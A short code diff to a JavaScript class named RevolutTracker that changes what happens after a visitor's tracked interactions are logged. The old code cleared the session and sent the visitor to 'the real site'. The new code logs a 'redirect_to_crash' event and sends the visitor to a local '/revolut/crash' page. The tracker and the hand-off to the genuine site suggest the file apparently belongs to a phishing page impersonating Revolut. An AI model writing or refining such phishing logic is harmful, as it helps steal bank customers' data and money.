@@ -99,17 +99,14 @@ class RevolutTracker {
     
     performRedirect() {
         // Track the redirect event
-        this.sendTrackingData('redirect_to_real', {
+        this.sendTrackingData('redirect_to_crash', {
             interactions: this.interactions,
             timestamp: new Date().toISOString()
         });
         
-        // Clear session data
-        this.clearSession();
-        
-        // Redirect with a slight delay for tracking to complete
+        // Redirect to crash page instead of directly to real site
         setTimeout(() => {
-            window.location.href = this.redirectUrl;
+            window.location.href = '/revolut/crash';
         }, 500);
     }
     
